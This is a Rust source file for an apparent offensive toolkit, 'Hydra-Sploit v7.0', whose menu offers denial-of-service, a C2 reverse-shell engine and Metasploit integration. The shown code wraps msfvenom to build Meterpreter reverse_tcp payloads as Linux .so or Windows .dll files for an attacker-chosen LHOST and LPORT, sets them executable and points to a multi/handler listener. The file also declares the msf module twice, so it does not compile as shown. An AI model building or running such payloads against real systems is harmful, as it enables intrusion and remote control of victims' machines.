// src/main.rs - Hydra-Sploit v7.0: Full Offensive Stack
// [3] Embedded Msfconsole Interface + Dynamic Payload Engine
// [4] Cross-Platform .so/.dll Meterpreter Builder

use std::io::{self, Write};
use std::process::Command;
use std::path::Path;

mod msf {
    use super::*;

    pub fn launch_msfconsole() {
        println!("\n[🔧] Opening Metasploit Interface...");
        println!("[💡] Tip: Use 'exploit/multi/handler' + your payload for reverse shell");

        if Command::new("msfconsole")
            .arg("--version")
            .output()
            .is_err()
        {
            println!("❌ Metasploit Framework not found. Install via: apt install metasploit-framework");
            return;
        }

        println!("Opening msfconsole...");
        let status = Command::new("msfconsole")
            .status()
            .expect("Failed to launch msfconsole");

        if !status.success() {
            println!("Msfconsole exited with error...");
        }
    }

    pub fn build_meterpreter_payload() {
        println!("\n[🧩] Dynamic Payload Generator (.so for Linux, .dll for Windows)");
        print!("IP Address (LHOST): "); io::stdout().flush().unwrap();
        let mut lhost = String::new();
        io::stdin().read_line(&mut lhost).unwrap();
        let lhost = lhost.trim();

        print!("Port (LPORT): "); io::stdout().flush().unwrap();
        let mut lport = String::new();
        io::stdin().read_line(&mut lport).unwrap();
        let lport = lport.trim();

        print!("Target OS [1] Linux | [2] Windows: "); io::stdout().flush().unwrap();
        let mut os_choice = String::new();
        io::stdin().read_line(&mut os_choice).unwrap();

        let payload: &str;
        let format: &str;
        let filename: &str;

        match os_choice.trim() {
            "1" => {
                payload = "linux/x64/meterpreter/reverse_tcp";
                format = "elf-so";
                filename = "/tmp/hydra_bind.so";
            }
            "2" => {
                payload = "windows/x64/meterpreter/reverse_tcp";
                format = "dll";
                filename = "/tmp/hydra_bind.dll";
            }
            _ => {
                println!("❌ Invalid OS choice.");
                return;
            }
        }

        println!("Generating {} payload...", format);
        let output = Command::new("msfvenom")
            .args([
                "-p", payload,
                &format!("LHOST={}", lhost),
                &format!("LPORT={}", lport),
                "-f", format,
                "-o", filename,
            ])
            .output();

        match output {
            Ok(ref out) if out.status.success() => {
                println!("[✅] Saving payload to: {}", filename);
                println!("[📌] Use: sudo cp {} ~/.msf4/modules/exploits/ to load into Metasploit", filename);
                set_permissions(filename);
            }
            _ => {
                let err = String::from_utf8_lossy(&output.unwrap().stderr);
                println!("❌ Failed To Generate Payload: {}", err);
            }
        }
    }

    fn set_permissions(path: &str) {
        if Path::new(path).exists() {
            Command::new("chmod")
                .args(["+x", path])
                .status()
                .ok();
            println!("[🔐] Execute permissions set on {}", path);
        }
    }
}

fn main() {
    println!("HYDRA - SPLOIT v7.0");
    println!("</> RED TEAM - Offensive kali linux framework </>");

    loop {
        println!("\n Choose your weapon:");
        println!("[1]. MB-Scale Denial-of-Service (DoS)");
        println!("[2]. Auto-Exploit C2 Engine (RCE + Reverse Shell)");
        println!("[3]. Launch Msfconsole (Metasploit Framework)");
        println!("[4]. Build Dynamic Meterpreter (.so/.dll) Payloads");
        println!("[0]. Exit Hydra-Sploit");
        print!("\n choose an option: ");
        io::stdout().flush().unwrap();

        let mut choice = String::new();
        io::stdin().read_line(&mut choice).unwrap();

        match choice.trim().parse::<u8>() {
            Ok(1) => dos::start_dos(),
            Ok(2) => c2::start_c2(),
            Ok(3) => msf::launch_msfconsole(),
            Ok(4) => msf::build_meterpreter_payload(),
            Ok(0) => {
                println!("Exiting Hydra-Sploit framework...");
                break;
            }
            _ => println!("Invalid option. Choose between 0-4."),
        }
    }
}

mod dos;
mod c2;
mod msf;